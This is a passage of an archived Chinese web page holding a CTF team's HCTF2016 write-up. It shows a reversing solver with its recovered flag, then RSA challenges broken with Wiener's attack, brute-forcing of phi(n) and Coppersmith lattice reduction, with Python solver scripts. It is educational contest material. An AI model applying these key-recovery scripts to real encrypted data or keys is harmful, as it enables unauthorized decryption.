class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;(v7&amp;(1&lt;&lt;l)!=0):</code></div><div class="line number30 index29 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">z&nbsp;|=&nbsp;(1&lt;&lt;list1[l])</code></div><div class="line number31 index30 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;(v8&amp;(1&lt;&lt;l)!=0):</code></div><div class="line number32 index31 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">z&nbsp;|=&nbsp;(1&lt;&lt;list2[l])</code></div><div class="line number33 index32 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#print&nbsp;"z=",bin(z)</code></div><div class="line number34 index33 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;(z==init[k*4+l]):</code></div><div class="line number35 index34 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;i</code></div><div class="line number36 index35 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;l</code></div><div class="line number37 index36 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;(l==3):</code></div><div class="line number38 index37 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;k*4+l,v8,v7</code></div><div class="line number39 index38 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">list3[k]&nbsp;=&nbsp;v7</code></div><div class="line number40 index39 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">list3[51-k]&nbsp;=&nbsp;v8</code></div><div class="line number41 index40 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"z=",bin(z)</code></div><div class="line number42 index41 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">break</code></div><div class="line number43 index42 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">else:</code></div><div class="line number44 index43 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">break</code></div><div class="line number45 index44 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;(z!=init[k*4+l])&nbsp;and&nbsp;i==255:</code></div><div class="line number46 index45 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"error"</code></div><div class="line number47 index46 alt2"><code class="plain plain">print&nbsp;list3</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">得到结果</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t011e8eb4c839082bbc.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t011e8eb4c839082bbc.png" title="t01d25263ccdab2b8a0.png" alt="http://p1.qhimg.com/t01d25263ccdab2b8a0.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">重新编码后为	</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Hctf{L1ttl3_f1lip_Game3_for_</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">加上的前面的74343}</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后为</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Hctf{L1ttl3_f1lip_Game3_for_74343}</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01d152cc253d7268be.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01d152cc253d7268be.png" title="t011137f06ce80a88c5.png" alt="http://p3.qhimg.com/t011137f06ce80a88c5.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前年的400分</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">关键位置sub_401090,用ida f5之后，整理数据可得</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01027353e9a901c428.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01027353e9a901c428.png" title="t0128270f7a89242b74.png" alt="http://p4.qhimg.com/t0128270f7a89242b74.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">是一个多元一次方程组的形式，写脚本把每个未知数的系数提取出来建立矩阵，判断结果也提取出来建立矩阵，交给matlab即可得到答案。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01ea8fd670933e419c.jpg" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01ea8fd670933e419c.jpg" title="t0148c4700012ea6b87.jpg" alt="http://p0.qhimg.com/t0148c4700012ea6b87.jpg" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Crypto So Interesting</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">题目中t，e是关于bt的逆元，直接求出t。u 1024bit，ut是phi n的一对逆元，直接wiener attack，跑出u。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ut是phi n的倍数，直接暴力跑phi n，得到phi n，解d，得到flag：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">bt=536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L</code></div><div class="line number2 index1 alt1"><code class="plain plain">n=0xea9c2c15896c2353cea7d6eeccc80ce89ca7324fdba7768ebfd10577c599b6eafaed93e719b6d69215af1c3e59d1930a71fb872ef22d28de9ffceedb854f7c10996256621d5e8941934eb284375b3b773b87ee8ded799318c8d0323e8bf98495b76336ee136a650a57fbe710666178343e77e79cb3a7d28e8c2dfba4b85105f7a381d39c163ee79246248c0402f4d9b25404a22daf5e64d0a72454649643af2d3bde001a7f127203cfc9a34bb993c3e1a532115ec53cb679e618d46832922d72f7f67e2b627c077c2f366ef7f0828a3c64895291e00b98413e6e28eca033b896703fad3bf133f34ed6e1a6fc641b33da0df745c1ecf421a058c2a7e44becf1f07fadf1eacf18810c56473e6d59a6af8221d1ae6e0547f1014018c90f175441e7efa724112a5949e6860358176ecfc4b42c0653df56ed4c52cfd44d7e02326400bcc66040bb6d7a7ed149da2eec485d9c2f84080fff045eeedbf7109aacdb4aa4e5c0c6884b57c0c86c22e934f8fc18369e19206fc52a618b892e3eb97f01d8d438bd61291823ce1d08e6af084e5a9fe528db5eead2eefa4ed3812faa48eab7aaa3430bdaa7bed31d4949391efbaadc8c57d02443388c1f028823d4fd0b9ab5548136a86974badf987369411a93c40af8d7a66d21575fdd9ef90b1ab2a1cbea1bd4b5f9ea44e081f138ffb743153f6047d63f1311d93a3f4dd0fa6791e0f881c3L</code></div><div class="line number3 index2 alt2"><code class="plain plain">e=0x1f11d804be3e294d0f537fc8c945f2b39fe27ec62a0b5d65c8b2d8fdd7e90cebd767b3d2de457cc580454e8359857bbd512e8a41124388dd0cd051c58e0db39b9f55a0d48296df58721fdff8694691436f274e6b1307a9be83b097b9cd05679f7b7a0c2689352f254bc18f1965863c77d034fc9736744a2b2da3a5fead5ce1a9691e655fb36ba12584d49f332a024f75923ec5752a49f53a097bada8de98bd0e58062c74b92d19f08aaa13f130cba42acd72c374de64b66374f099bb693d68023bc6f75be6df31d01dd182317439c2ff73bb8e3af7751a65ae7d69197f9c1764430dc9e49cb5ea5e93867a5d695626ff5fe23283ae8a758a0ba902512cd6e57061644f774200dc44b1b50402306332d3483bc8000f7aa6247fc064efc27431effe78e85fd83e2c314b0d98a40d47e6a0266e0fed9a800adab382d0fe1881130784167a3d36b1f3b3f3d2aba31c86e2c037da5a79289bbb868f6bed4d76bed0bb5a2b317d05be1b64895a9bfad508a6cd36c26510731810ef712e06df60ba09097951b1b401a84ef3feb953de7325b8a4854ca512eaf93e50baf6b1f641d559e529ce0fbbf0856658e2256d123067ae68416ac6a544475652ee28afa243566ad52ce19380f1f8f69991186ea0ec5495b646fa96702586ac24ebe614cfdd765dd3a79be12344c19ac316eea13006deef635daa2cba1b8396d854287c2b80d6dd45L</code></div><div class="line number4 index3 alt1"><code class="plain plain">c=0xc6a7aa2373cb91df3028341d64bc173ac97ebcdb77cbc93276050e428bc96b4b639296a815641e9281d8ba1028cdc395877889e5b39a30f13682f4bee5026ab1a63218b1a099fb1364bf0040bb5769c92aad8f9215b7ff4d3b51a37f6384124d761f4cc1fd12da4e4c165896b78496ef1a71e1e3d8370469ebfcbe3e611a1573b6a89a07942b86727a79ad57fb14c67826a546acf8d12bb7411f0c1aba989a80c7b24afb5ebc216beda3eeb90894459c984a2f6b31ea755481c7fed9c14e2f9497ce99fc68e085bd8ad6841b37556d7bb8282ae0b4bf3160f99f6f9cc7b762548f7cc82d8aa656df5cf1178bfa4f237bfd71c8303a4277aea97df59606455c2050778d62b9803c87411f49c1816dacb1b1337647082f00983d167204d2c20b3cabc603fe0746d5110dff5a7beac602d5d3552757c7ffdc53132d913b810861f807861b41931dc244a2391f17456962080c010bb781a88de38778aacd4c4fed7c8be701c45eab643202c6ee0794167accd911103ab0310c1e3a7301b8d0b011b11da3d19defb8fb7e43f290a96a376115a58463d2629ed56955fcba4255295a35888534cd9118c006d3be48d3309a988f6d10b98d53a3f2fcfe3cc2ece34a6938e7b638a09120bf8b43ec1ab5411918f00f7951120e706bd2d3fcbf3b02420b76607275855b0f1013617907bd97611941a3b59b303c2f269cfb9efda02b720781L</code></div><div class="line number5 index4 alt2"><code class="plain plain">import&nbsp;primefac</code></div><div class="line number6 index5 alt1"><code class="plain plain">t=primefac.modinv(e,bt)%bt</code></div><div class="line number7 index6 alt2"><code class="plain plain">u=211757679145028339938159484490447515548960143376668686540553739283248408071060409284215944478501055427457658526200153976152365874273290079822453866683250687702248578806253044320606491556393838710622190294900967609883011924833456481340748552987157053533389305302512414202183400445958479477845751</code></div><div class="line number8 index7 alt1"><code class="plain plain">print&nbsp;u*t-1</code></div><div class="line number9 index8 alt2"><code class="plain plain">def&nbsp;num2str(num):</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">tmp=hex(num)[2:].replace("L","")</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;len(tmp)&nbsp;%&nbsp;2&nbsp;==&nbsp;0:</code></div><div class="line number12 index11 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;tmp.decode("hex")</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">else:</code></div><div class="line number14 index13 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;("0"+tmp).decode("hex")</code></div><div class="line number15 index14 alt2"><code class="plain plain">last=(u*t-1)&nbsp;%&nbsp;((2**6)*3*5*7*13*19*73*151*163*1693*3853*9941)</code></div><div class="line number16 index15 alt1"><code class="plain plain">all=[2,2,2,2,2,2,3,5,7,13,19,73,151,163,1693,3853,9941,last]</code></div><div class="line number17 index16 alt2"><code class="plain plain">for&nbsp;i1&nbsp;in&nbsp;all:</code></div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">testphin=(u*t-1)/i1</code></div><div class="line number19 index18 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">try:</code></div><div class="line number20 index19 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">d=primefac.modinv(e,testphin)%testphin</code></div><div class="line number21 index20 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">except:</code></div><div class="line number22 index21 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">continue</code></div><div class="line number23 index22 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;pow(c,d,n)</code></div><div class="line number24 index23 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;num2str(pow(c,d,n))</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Crypto So Cool</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">gen_key中看出n的第128比特到128+640bit是u，也就是p的前面640个bit。以前弄格基规约的时候用过的一份github上的sage代码可解：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage" _src="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">解出的是pbar-p，用pbar减去该值即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">from&nbsp;Crypto.Util.number&nbsp;import&nbsp;long_to_bytes,&nbsp;bytes_to_long</code></div><div class="line number2 index1 alt1"><code class="plain plain">from&nbsp;Crypto.Cipher&nbsp;import&nbsp;DES</code></div><div class="line number3 index2 alt2"><code class="plain plain">key&nbsp;=&nbsp;"abcdefg1"</code></div><div class="line number4 index3 alt1"><code class="plain plain">def&nbsp;pi_b(x,&nbsp;m):</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">'''</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">m:</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">1:&nbsp;encrypt</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0:&nbsp;decrypt</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">'''</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">enc&nbsp;=&nbsp;DES.new(key)</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;m:</code></div><div class="line number12 index11 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">method&nbsp;=&nbsp;enc.encrypt</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">else:</code></div><div class="line number14 index13 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">method&nbsp;=&nbsp;enc.decrypt</code></div><div class="line number15 index14 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">s&nbsp;=&nbsp;long_to_bytes(x)</code></div><div class="line number16 index15 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">sp&nbsp;=&nbsp;[s[a:a+8]&nbsp;for&nbsp;a&nbsp;in&nbsp;xrange(0,&nbsp;len(s),&nbsp;8)]</code></div><div class="line number17 index16 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">r&nbsp;=&nbsp;""</code></div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">for&nbsp;a&nbsp;in&nbsp;sp:</code></div><div class="line number19 index18 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">r&nbsp;+=&nbsp;method(a)</code></div><div class="line number20 index19 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;bytes_to_long(r)</code></div><div class="line number21 index20 alt2"><code class="plain plain">def&nbsp;num2str(num):</code></div><div class="line number22 index21 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">tmp=hex(num)[2:].replace("L","")</code></div><div class="line number23 index22 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;len(tmp)&nbsp;%&nbsp;2&nbsp;==&nbsp;0:</code></div><div class="line number24 index23 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;tmp.decode("hex")</code></div><div class="line number25 index24 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">else:</code></div><div class="line number26 index25 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain 